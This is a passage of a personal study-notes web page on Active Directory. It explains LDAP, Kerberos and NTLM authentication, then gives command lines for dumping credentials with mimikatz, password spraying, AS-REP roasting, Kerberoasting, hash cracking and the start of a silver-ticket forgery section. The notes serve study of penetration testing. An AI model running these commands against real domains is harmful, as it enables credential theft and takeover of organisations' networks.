<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-general/AD" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">AD | Welcome, Traveller</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://jh1h1h.github.io/portfolio/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://jh1h1h.github.io/portfolio/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://jh1h1h.github.io/portfolio/docs/general/AD"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="AD | Welcome, Traveller"><meta data-rh="true" name="description" content="Active Directory (AD) is a service that allow admins to manage collections of machines at the same time. Each domain is managed by a central machine known as the domain controller (DC)."><meta data-rh="true" property="og:description" content="Active Directory (AD) is a service that allow admins to manage collections of machines at the same time. Each domain is managed by a central machine known as the domain controller (DC)."><link data-rh="true" rel="icon" href="/portfolio/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://jh1h1h.github.io/portfolio/docs/general/AD"><link data-rh="true" rel="alternate" href="https://jh1h1h.github.io/portfolio/docs/general/AD" hreflang="en"><link data-rh="true" rel="alternate" href="https://jh1h1h.github.io/portfolio/docs/general/AD" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"General","item":"https://jh1h1h.github.io/portfolio/docs/category/general"},{"@type":"ListItem","position":2,"name":"AD","item":"https://jh1h1h.github.io/portfolio/docs/general/AD"}]}</script><link rel="alternate" type="application/rss+xml" href="/portfolio/blog/rss.xml" title="Welcome, Traveller RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/portfolio/blog/atom.xml" title="Welcome, Traveller Atom Feed"><link rel="stylesheet" href="/portfolio/assets/css/styles.c7e8469a.css">
<script src="/portfolio/assets/js/runtime~main.47725afc.js" defer="defer"></script>
<script src="/portfolio/assets/js/main.7ab7e381.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/portfolio/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/portfolio/"><div class="navbar__logo"><img src="/portfolio/img/logo.svg" alt="Portfolio Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/portfolio/img/logo.svg" alt="Portfolio Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Portfolio</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/portfolio/docs/intro">Notes</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/portfolio/docs/intro"><span title="Welcome to My Notes" class="linkLabel_WmDU">Welcome to My Notes</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/portfolio/docs/category/procedure"><span title="Procedure" class="categoryLinkLabel_W154">Procedure</span></a><button aria-label="Expand sidebar category &#x27;Procedure&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/portfolio/docs/category/general"><span title="General" class="categoryLinkLabel_W154">General</span></a><button aria-label="Collapse sidebar category &#x27;General&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/portfolio/docs/general/AD"><span title="AD" class="linkLabel_WmDU">AD</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Backgrounding"><span title="Backgrounding" class="linkLabel_WmDU">Backgrounding</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Buffer Overflow"><span title="Buffer Overflow" class="linkLabel_WmDU">Buffer Overflow</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Connecting"><span title="Connecting" class="linkLabel_WmDU">Connecting</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Download &amp; Upload"><span title="Download &amp; Upload" class="linkLabel_WmDU">Download &amp; Upload</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Jenkins"><span title="Jenkins" class="linkLabel_WmDU">Jenkins</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/NTLM"><span title="NTLM" class="linkLabel_WmDU">NTLM</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/RPC"><span title="RPC" class="linkLabel_WmDU">RPC</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Reverse Shell"><span title="Reverse Shell" class="linkLabel_WmDU">Reverse Shell</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/SMB"><span title="SMB" class="linkLabel_WmDU">SMB</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/portfolio/docs/general/Wireshark"><span title="Wireshark" class="linkLabel_WmDU">Wireshark</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/portfolio/docs/category/interview"><span title="Interview" class="categoryLinkLabel_W154">Interview</span></a><button aria-label="Expand sidebar category &#x27;Interview&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/portfolio/docs/category/writeups"><span title="Writeups" class="categoryLinkLabel_W154">Writeups</span></a><button aria-label="Expand sidebar category &#x27;Writeups&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/portfolio/docs/category/appendix"><span title="Appendix" class="categoryLinkLabel_W154">Appendix</span></a><button aria-label="Expand sidebar category &#x27;Appendix&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/portfolio/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/portfolio/docs/category/general"><span>General</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">AD</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>AD</h1></header><p>Active Directory (AD) is a service that allow admins to manage collections of machines at the same time. Each domain is managed by a central machine known as the domain controller (DC).</p>
<p>With sufficient perms, u can just change another user’s pw using <code>net user &lt;user&gt; &lt;new pw&gt; /domain</code></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="core-concepts">Core concepts<a href="#core-concepts" class="hash-link" aria-label="Direct link to Core concepts" title="Direct link to Core concepts" translate="no">​</a></h2>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>powerful groups: Domain Admins, Enterprise Admins</p><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ldap">LDAP<a href="#ldap" class="hash-link" aria-label="Direct link to LDAP" title="Direct link to LDAP" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>When we query user or group objects, LDAP is used as the communication channel for the query.</p><p><code>LDAP://HostName[:PortNumber][/DistinguishedName]</code></p><p>Hostname: hostname(computer name / IP / domain name) of DC holding the PdcRoleOwner property</p><p>(optional) Port: for DC using non-default ports</p><p>(optional) Distinguished Name: <a class="" href="/portfolio/docs/general/AD#distinguished-name">here</a></p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="distinguished-name">Distinguished Name<a href="#distinguished-name" class="hash-link" aria-label="Direct link to Distinguished Name" title="Direct link to Distinguished Name" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Every object has a DN, leftmost is highest hierarchy (like parent or smth) and rightmost is lowest hierarchy. Eg, <code>CN=Stephanie,CN=Users,DC=corp,DC=com</code> is a DN for the user Stephanie, as u can see the hierarchy goes from left to right</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ntlm-auth-steps">NTLM Auth Steps<a href="#ntlm-auth-steps" class="hash-link" aria-label="Direct link to NTLM Auth Steps" title="Direct link to NTLM Auth Steps" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.</p><p><img decoding="async" loading="lazy" alt="NTLM Auth Steps" src="/portfolio/assets/images/NTLMauth-9a448fec46653ba44661a7c711975783.png" width="944" height="839" class="img_ev3q"></p><p>Step 4 response is encrypted using the hash from step 1. DC already knows NTLM hash of all users.</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="kerberos-auth-steps">Kerberos Auth Steps<a href="#kerberos-auth-steps" class="hash-link" aria-label="Direct link to Kerberos Auth Steps" title="Direct link to Kerberos Auth Steps" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Default authentication mechanism for modern AD. Kerberos stores cached hashes in LSASS. Mimikatz is a tool that helps to extract stuff from LSASS.</p><p><img decoding="async" loading="lazy" alt="Kerberos Auth Steps" src="/portfolio/assets/images/KerberosAuth-6790e626e4a45dbfcd584dab1aff8735.png" width="942" height="836" class="img_ev3q"></p><p>Step 1 (AS-REQ) (also known as preauthentication): Timestamp encrypted using a hash dervied from the user&#x27;s password</p><p>DC knows the hashes for all users, and decrypts the AS-REQ, checks that the timestamp is valid.</p><p>Step 2 (AS-REP): If valid, AS-REP will contain a session key (encrypted using the password hash) and ticket-granting ticket (TGT) (encrypted using krbtgt&#x27;s hash). By default TGTs are valid for 10h.</p><p>When user wants to use a service, DC will be contacted again, initiating Step 3.</p><p>Step 3 (TGS-REQ): {user + timestamp} (encrypted with session key), resource name, and encrypted TGT.</p><p>DC checks: Timestamp must be valid, username encrypted with session key must match TGT, source IP has to match TGT, then TGS-REP is sent</p><p>Step 4 (TGS-REP): name of service granted (encrypted with session key from step 2), new session key (encrypted with session key from step 2), service ticket (known as TGS) with username, groups, and new session key (service ticket/TGS is encrypted with password hash of service account).</p><p>User will then continue auth with the actual service.</p><p>Step 5 (AP-REQ): username &amp; timestamp (encrypted with new session key from step 4), and TGS</p><p>Application server decrypts the TGS to get username, and checks if it matches username from the other part of AP-REQ. Then it will check the groups listed in the TGS and assign the user the appropriate perms and then send AP-REP.</p><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962" target="_blank" rel="noopener noreferrer" class="">Privileged Account Certificate</a> (PAC) <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84" target="_blank" rel="noopener noreferrer" class="">validation</a> is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller.</p><p>[WIP] read and add info from this <a href="https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don&#x27;t-Get-It-wp.pdf" target="_blank" rel="noopener noreferrer" class="">link</a> about the hash that Kerberos uses in Step 1</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ad-permissions">AD permissions<a href="#ad-permissions" class="hash-link" aria-label="Direct link to AD permissions" title="Direct link to AD permissions" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>[Highest] GenericAll: Full permissions on object</p><p>GenericWrite: Edit certain attributes on the object</p><p>WriteOwner: Change ownership of the object</p><p>WriteDACL: Edit ACE&#x27;s applied to object</p><p>AllExtendedRights: Change password, reset password, etc.</p><p>ForceChangePassword: Password change for object</p><p>Self (Self-Membership): Add ourselves to for example a group</p><p>(more…)[<a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks" target="_blank" rel="noopener noreferrer" class="">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks</a>]</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="default-users">Default Users<a href="#default-users" class="hash-link" aria-label="Direct link to Default Users" title="Direct link to Default Users" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Administrator, Krbtgt, Guest, some super long SID</p><p>(so that when enumerating u can note down the non-default users maybe idk)</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="miscellaneous">Miscellaneous<a href="#miscellaneous" class="hash-link" aria-label="Direct link to Miscellaneous" title="Direct link to Miscellaneous" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p><a href="https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices?view=windowsdesktop-9.0" target="_blank" rel="noopener noreferrer" class="">https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices?view=windowsdesktop-9.0</a></p><p>DirectoryEntry class encapsulates an AD object</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$DN = ([adsi]&#x27;&#x27;).distinguishedName</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$LDAP = &quot;LDAP://$PDC/$DN&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)</span><br></span></code></pre></div></div></div></div></details><p>DirectorySearcher class performs queries against AD</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$dirsearcher.filter=&quot;samAccountType=805306368&quot; #Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$dirsearcher.FindAll()</span><br></span></code></pre></div></div></div></div></details></div></div></details></div></div></details>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration" translate="no">​</a></h2>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>If can upload stuff</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p><a class="" href="/portfolio/docs/general/Download &amp; Upload">Upload</a> mimikatz.exe and SharpHound.ps1</p><p>Bloodhound/sharphound: [WIP]</p><p>Mimikatz: <code>privilege::debug</code> first, then <code>sekurlsa::logonpasswords</code> for NTLM hash, <code>sekurlsa::tickets /export</code> for tickets. <code>log</code> to save output to file (for easier searching)</p></div></div></details></div></div></details>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploit-methods">Exploit Methods<a href="#exploit-methods" class="hash-link" aria-label="Direct link to Exploit Methods" title="Direct link to Exploit Methods" translate="no">​</a></h2>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="spray-passwords">Spray Passwords<a href="#spray-passwords" class="hash-link" aria-label="Direct link to Spray Passwords" title="Direct link to Spray Passwords" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p><code>net accounts</code> to check lockout threshold and duration. observation window is the time the threshold will reset. window of 30 mins with threshold of 5 means that u can safely submit 4 wrong attempts every 30 minutes without lockout.</p><ol>
<li class="">causes a lot more traffic: on kali - <code>crackmapexec smb &lt;target ip&gt; -u &lt;wordlist&gt; -p &#x27;&lt;pw&gt;&#x27; -d &lt;domain name like corp.com&gt; --continue-on-success</code> . displays (Pwn3d!) at the end if user cracked is an admin</li>
<li class="">if u have rdp session: copy Spray-Passwords.ps1 over to machine, then run <code>.\Spray-Passwords.ps1 -Pass &lt;pw&gt; -Admin</code> where -Admin will spray it against all domain admins</li>
<li class="">if u have rdp session: copy kerbrute_windows_amd64.exe over to machine, then run <code>.\kerbrute_windows_amd64.exe passwordspray -d &lt;domain name like corp.com&gt; .\usernames.txt &quot;&lt;pw&gt;”</code> where -Admin will spray it against all domain admins</li>
</ol></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="as-rep-roasting-cracking-user-pw">AS-REP Roasting (cracking user pw)<a href="#as-rep-roasting-cracking-user-pw" class="hash-link" aria-label="Direct link to AS-REP Roasting (cracking user pw)" title="Direct link to AS-REP Roasting (cracking user pw)" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: &#x27;Do not require Kerberos preauthentication&#x27; is set to &#x27;enabled&#x27;.</p><p>Run <code>impacket-GetNPUsers -dc-ip &lt;domain controller ip&gt;  -request -outputfile hashes.asreproast &lt;domain&gt;/&lt;user&gt;</code> (eg <code>impacket-GetNPUsers -dc-ip &lt;domain controller ip&gt; -request -outputfile hashes.asreproast corp.com/&lt;user&gt;</code>). Then run <code>hashcat --help | grep -i &quot;Kerberos&quot;</code> and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run <code>sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p><p>When preauthentication is not enabled, we can just send username over without any encrypted timestamp and the DC will give u the AS-REP. If u can crack the AS-REP u can get the user&#x27;s password.</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="kerberoasting-cracking-servicespn-pw">Kerberoasting (cracking service/SPN pw)<a href="#kerberoasting-cracking-servicespn-pw" class="hash-link" aria-label="Direct link to Kerberoasting (cracking service/SPN pw)" title="Direct link to Kerberoasting (cracking service/SPN pw)" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>The TGS from Step 4 of <a class="" href="/portfolio/docs/general/AD#kerberos-auth-steps">Kerberos Auth</a> is encrypted using the SPN&#x27;s password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as <a href="https://blog.harmj0y.net/redteaming/kerberoasting-revisited/" target="_blank" rel="noopener noreferrer" class="">Kerberoasting</a>.</p><p>Powershell: <code>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code></p><p>Linux: <code>sudo impacket-GetUserSPNs -request -dc-ip &lt;domain controller ip&gt; &lt;domain&gt;/&lt;user&gt;</code> must use a known user and pssword, then <code>sudo hashcat -m 13100 &lt;hash file&gt; /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p><p>If you have GenericAll or GenericWrite on a user, u can set an <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)" target="_blank" rel="noopener noreferrer" class="">SPN for the user</a>, kerberoast the account, and crack the password hash</p></div></div></details><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="silver-ticket-forge-tgs-to-access-services">Silver Ticket (forge TGS to access services)<a href="#silver-ticket-forge-tgs-to-access-services" class="hash-link" aria-label="Direct link to Silver Ticket (forge TGS to access services)" title="Direct link to Silver Ticket (forge TGS to access services)" translate="no">​</a></h3><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary>Details</summary><div><div class="collapsibleContent_i85q"><p>Requires: Privileged Account Certificate (PAC) validation is disabled (quite common), and possession of service account password/hash (can obtain via <a class="" href="/portfolio/docs/general/AD#kerberoasting-cracking-servicespn-pw">kerberoasting</a>)</p><p>With hash of service account, u can forge a TGS from step 4 of <a class="" href="/portfolio/docs/general/AD#kerberos-auth-steps">kerberos auth</a>.</p><p>We need three things:</p><ul>
<li class="">SPN password hash: run mimikatz and then <code>privilege::debug</code> and <code>sekurlsa::logonpasswords</code> and look for the service account entry and take the NTML hash</li>
